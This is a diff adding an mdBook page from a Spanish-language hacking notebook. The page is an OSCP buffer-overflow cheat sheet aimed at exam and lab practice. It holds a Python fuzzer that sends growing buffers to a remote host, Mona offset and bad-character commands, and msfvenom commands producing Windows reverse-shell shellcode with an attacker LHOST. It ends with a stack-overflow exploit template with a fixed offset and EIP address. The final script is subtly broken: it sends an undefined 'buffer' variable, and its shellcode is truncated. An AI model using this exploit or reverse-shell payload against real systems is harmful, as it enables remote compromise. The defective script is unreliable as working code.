@@ -1,0 +1,293 @@
+<!DOCTYPE HTML>
+<html lang="es" class="sidebar-visible no-js ayu">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>OSCP Buffer Overflow - Secronomicón</title>
+        <!-- Custom HTML head -->
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="Libro de notas donde encontrarás cada truco/técnica/guía de hacking que he aprendido y recolectado de CTFS, aplicaciones reales, lectura de writeups y noticias.">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "ayu" : "ayu";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('ayu')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded affix "><a href="../../index.html">Secronomicón</a></li><li class="chapter-item expanded affix "><li class="part-title">Guías / Cursos</li><li class="chapter-item expanded "><a href="../../guides/oscp_bof/index.html"><strong aria-hidden="true">1.</strong> OSCP Buffer Overflow</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">2.</strong> Port Swigger Academy</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../guides/port_swigger_academy/sql_injection.html"><strong aria-hidden="true">2.1.</strong> SQL Injection</a></li></ol></li><li class="chapter-item expanded "><a href="../../guides/pwncollege/index.html"><strong aria-hidden="true">3.</strong> PwnCollege</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../guides/pwncollege/0_module/index.html"><strong aria-hidden="true">3.1.</strong> Módulo 0</a></li></ol></li><li class="chapter-item expanded "><a href="../../guides/active_directory/index.html"><strong aria-hidden="true">4.</strong> Active Directory</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../guides/active_directory/0_general.html"><strong aria-hidden="true">4.1.</strong> Teoría General</a></li><li class="chapter-item expanded "><a href="../../guides/active_directory/1_attacking.html"><strong aria-hidden="true">4.2.</strong> Atacando Active Directory</a></li></ol></li><li class="chapter-item expanded "><a href="../../guides/ecpptv2_lab/index.html"><strong aria-hidden="true">5.</strong> eCPPTv2 s4viLab</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../guides/ecpptv2_lab/1_aragog/index.html"><strong aria-hidden="true">5.1.</strong> Aragog</a></li><li class="chapter-item expanded "><a href="../../guides/ecpptv2_lab/2_nagini/index.html"><strong aria-hidden="true">5.2.</strong> Nagini</a></li><li class="chapter-item expanded "><a href="../../guides/ecpptv2_lab/3_fawkes/index.html"><strong aria-hidden="true">5.3.</strong> Fawkes</a></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.4.</strong> Matrix 1</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">5.5.</strong> Brainpan</div></li></ol></li><li class="chapter-item expanded "><a href="../../guides/nightmare/index.html"><strong aria-hidden="true">6.</strong> Nightmare</a></li><li class="chapter-item expanded affix "><li class="part-title">Misc</li><li class="chapter-item expanded "><a href="../../templates/index.html"><strong aria-hidden="true">7.</strong> Templates</a></li><li class="chapter-item expanded affix "><li class="part-title">Cheat Sheets</li><li class="chapter-item expanded "><a href="../../cheat_sheets/general.html"><strong aria-hidden="true">8.</strong> General</a></li><li class="chapter-item expanded "><a href="../../cheat_sheets/active_directory.html"><strong aria-hidden="true">9.</strong> Active Directory</a></li><li class="chapter-item expanded "><a href="../../cheat_sheets/network/general.html"><strong aria-hidden="true">10.</strong> Network</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../cheat_sheets/network/pivoting.html"><strong aria-hidden="true">10.1.</strong> Pivoting</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">11.</strong> Pwning</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../cheat_sheets/pwning/linux.html"><strong aria-hidden="true">11.1.</strong> Linux pwning</a></li><li class="chapter-item expanded "><a href="../../cheat_sheets/pwning/bof-oscp.html" class="active"><strong aria-hidden="true">11.2.</strong> OSCP Buffer Overflow</a></li></ol></li><li class="chapter-item expanded "><a href="../../cheat_sheets/fuzzing.html"><strong aria-hidden="true">12.</strong> Fuzzing</a></li><li class="chapter-item expanded "><a href="../../cheat_sheets/inyecciones.html"><strong aria-hidden="true">13.</strong> Inyecciones</a></li><li class="chapter-item expanded "><a href="../../cheat_sheets/transfer.html"><strong aria-hidden="true">14.</strong> Transferencia de archivos</a></li><li class="chapter-item expanded affix "><li class="part-title">CTFs</li><li class="chapter-item expanded "><a href="../../ctfs/20220922_ctf-core2022/index.html"><strong aria-hidden="true">15.</strong> 22/09/2022 - IPN Core 2022 CTF</a></li><li class="chapter-item expanded affix "><li class="part-title">Hack The Box</li><li class="chapter-item expanded "><div><strong aria-hidden="true">16.</strong> Battlegrounds</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../htb/battlegrounds/mayhem/index.html"><strong aria-hidden="true">16.1.</strong> Cyber Mayhem</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">17.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.</strong> Boxes</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.</strong> Linux</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.1.</strong> Fácil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.2.</strong> Medio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.3.</strong> Difícil</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.1.4.</strong> Locura</div></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.</strong> Windows</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.1.</strong> Fácil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../htb/boxes/windows/1_facil/Active/index.html"><strong aria-hidden="true">18.2.1.1.</strong> Active</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/1_facil/Devel/index.html"><strong aria-hidden="true">18.2.1.2.</strong> Devel</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/1_facil/Remote/index.html"><strong aria-hidden="true">18.2.1.3.</strong> Remote</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/1_facil/Access/index.html"><strong aria-hidden="true">18.2.1.4.</strong> Access</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.2.</strong> Medio</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../htb/boxes/windows/2_medio/Chatterbox/index.html"><strong aria-hidden="true">18.2.2.1.</strong> Chatterbox</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/2_medio/Jeeves/index.html"><strong aria-hidden="true">18.2.2.2.</strong> Jeeves</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/2_medio/SecNotes/index.html"><strong aria-hidden="true">18.2.2.3.</strong> SecNotes</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/2_medio/Silo/index.html"><strong aria-hidden="true">18.2.2.4.</strong> Silo</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.3.</strong> Difícil</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../htb/boxes/windows/3_dificil/Control/index.html"><strong aria-hidden="true">18.2.3.1.</strong> Control</a></li><li class="chapter-item expanded "><a href="../../htb/boxes/windows/3_dificil/Search/index.html"><strong aria-hidden="true">18.2.3.2.</strong> Search</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">18.2.4.</strong> Locura</div></li></ol></li></ol></li><li class="chapter-item expanded "><li class="part-title">echoCTF</li><li class="chapter-item expanded "><div><strong aria-hidden="true">19.</strong> Challenges</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">20.</strong> Networks</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.</strong> Targets</div></li><li><ol class="section"><li class="chapter-item expanded "><div><strong aria-hidden="true">21.1.</strong> Principiante</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.2.</strong> Básico</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../echoCTF/targets/2_basic/Flanders/index.html"><strong aria-hidden="true">21.2.1.</strong> Flanders</a></li><li class="chapter-item expanded "><a href="../../echoCTF/targets/2_basic/Smithers/index.html"><strong aria-hidden="true">21.2.2.</strong> Smithers</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.3.</strong> Intermedio</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.4.</strong> Avanzado</div></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.5.</strong> Experto</div></li><li><ol class="section"><li class="chapter-item expanded "><a href="../../echoCTF/targets/5_expert/gogo-yubari/index.html"><strong aria-hidden="true">21.5.1.</strong> Gogo Yubari</a></li><li class="chapter-item expanded "><a href="../../echoCTF/targets/5_expert/hajmetr/index.html"><strong aria-hidden="true">21.5.2.</strong> Hajmetr</a></li></ol></li><li class="chapter-item expanded "><div><strong aria-hidden="true">21.6.</strong> Guru</div></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Secronomicón</h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="oscp-buffer-overflow-cheat-sheet"><a class="header" href="#oscp-buffer-overflow-cheat-sheet">OSCP Buffer Overflow Cheat Sheet</a></h1>
+<div class="table-wrapper"><table><thead><tr><th>Fuzzing</th><th></th></tr></thead><tbody>
+<tr><td><code>msf-pattern_create -l &lt;longitud de bytes&gt;</code></td><td>Generación de patrón</td></tr>
+<tr><td><code>!mona pattern_create &lt;longitud de bytes&gt;</code></td><td>Generación de patrón</td></tr>
+<tr><td><code>msf-pattern_create -l &lt;EIP&gt;</code></td><td>Identificación offset</td></tr>
+<tr><td><code>!mona pattern_offset &lt;EIP&gt;</code></td><td>Identificación offset</td></tr>
+</tbody></table>
+</div>
+<h2 id="fuzzerpy"><a class="header" href="#fuzzerpy"><code>fuzzer.py</code></a></h2>
+<pre><code class="language-python">#from pwn import *
+import socket, sys, time
+
+if len(sys.argv) &lt; 2:
+   print &quot;\n[!] Uso: python &quot; + sys.argv[0] + &quot;&lt;ip-address&gt; &quot; + &quot;&lt;remote-port&gt;\n&quot;
+   sys.exit(0)
+
+ip_address = sys.argv[1]
+rport = int(sys.argv[2])
+
+if __name__ == '__main__':
+   contador = 100
+   #p1 = log.progress(&quot;Data&quot;) Log de datos en pwntools
+   while True:
+      #p1.status(f&quot;Enviando {contador} bytes.&quot;) Log de datos en pwntools
+      print &quot;Enviando %s bytes.&quot; % contador
+      buffer = 'A' * contador
+      try:
+         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+         s.connect((ip_address, rport))
+
+         data = s.recv(1024)
+         s.send(&quot;%s\r\n&quot; % buffer)
+         data = s.recv(1024)
+         contador += 100
+         time.sleep(1)
+      except Exception as ex:
+         print &quot;\n[!] Ha habido un error de conexion\n&quot;
+         print ex
+         sys.exit(1)
+</code></pre>
+<h2 id="bad-chars"><a class="header" href="#bad-chars">Bad Chars</a></h2>
+<div class="table-wrapper"><table><thead><tr><th>Identificar Bad Chars</th><th></th></tr></thead><tbody>
+<tr><td><code>!mona bytearray -cpb '\x00'</code></td><td>Generación de bytearray con excepciones</td></tr>
+<tr><td><code>!mona compare -f &lt;ubicacion de byte array .bin&gt; -a &lt;dirección de ESP&gt;</code></td><td>Comparación de bytearray contra ESP</td></tr>
+</tbody></table>
+</div>
+<h3 id="colección-en-arreglo"><a class="header" href="#colección-en-arreglo">Colección en arreglo</a></h3>
+<pre><code class="language-python">badchars = (
+  &quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;
+  &quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;
+  &quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;
+  &quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;
+  &quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;
+  &quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;
+  &quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;
+  &quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;
+  &quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;
+  &quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;
+  &quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;
+  &quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;
+  &quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;
+  &quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;
+  &quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;
+  &quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;
+)
+</code></pre>
+<h3 id="colección-plana"><a class="header" href="#colección-plana">Colección plana</a></h3>
+<p><code>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</code></p>
+<h2 id="búsqueda-para-ejecución"><a class="header" href="#búsqueda-para-ejecución">Búsqueda para ejecución</a></h2>
+<div class="table-wrapper"><table><thead><tr><th>Búsqueda de <code>jmp esp</code></th><th></th></tr></thead><tbody>
+<tr><td><code>!mona modules</code></td><td>Generación de patrón</td></tr>
+<tr><td><code>!mona find -s &quot;\xff\xe4&quot; -m &lt;nombre de dll&gt;</code></td><td>Generación de patrón</td></tr>
+</tbody></table>
+</div>
+<h2 id="payload"><a class="header" href="#payload">Payload</a></h2>
+<div class="table-wrapper"><table><thead><tr><th>Generación de payload</th><th></th></tr></thead><tbody>
+<tr><td><code>msfvenom -a x86 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai LHOST=&lt;ip&gt; LPORT=&lt;puerto&gt; -b '\x00' EXITFUNC=thread -i 3 -f python &gt; scode.txt</code></td><td>Encoder <code>shikata ga nai</code></td></tr>
+<tr><td><code>msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;puerto&gt; -b '\x00' EXITFUNC=thread -f python &gt; scode.txt</code></td><td>Sin encoder y si iteraciones</td></tr>
+</tbody></table>
+</div>
+<h2 id="exploit-final"><a class="header" href="#exploit-final">Exploit final</a></h2>
+<pre><code class="language-python">from struct import pack
+import socket, sys
+
+if len(sys.argv) &lt; 2:
+    print &quot;\n [!] Uso: python &quot; + sys.argv[0] + &quot;&lt;ip-address&gt;&quot; + &quot;&lt;remote-port&gt; \n&quot;
+    sys.exit(0)
+
+ip_address = sys.argv[1]
+rport = int(sys.argv[2])
+
+shellcode =  b&quot;&quot;
+shellcode += b&quot;\xb8\x36\xda\x75\x0f\xda\xd5\xd9\x74\x24\xf4\x5b\x2b&quot;
+
+#badchars = ()
+#badchars \x00\x23\x3c\x83\xba
+
+if __name__ == &quot;__main__&quot;:
+   prefix = &quot;&quot;
+   offset = 1052
+   filler = &quot;A&quot; * offset
+   eip = pack(&quot;&lt;L&quot;, 0x68a98a7b)
+   nops = &quot;\x90&quot; * 16
+   #nops = &quot;\x83\xEC\x10&quot; # sub esp, 0x10
+
+   #payload = prefix + filler + eip + badhchars
+   payload = prefix + filler + eip + nops + shellcode
+
+   try:
+      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      s.connect((ip_address, rport))
+      s.send(&quot;%s\r\n&quot; % buffer)
+   except Exception as ex:
+      print &quot;[!] Ha habido un error de conexion&quot;
+      print ex
+      sys.exit(1)
+</code></pre>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../cheat_sheets/pwning/linux.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                            <a rel="next" href="../../cheat_sheets/fuzzing.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../cheat_sheets/pwning/linux.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                    <a rel="next" href="../../cheat_sheets/fuzzing.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        <script src="../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../searcher.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+    </body>
+</html>
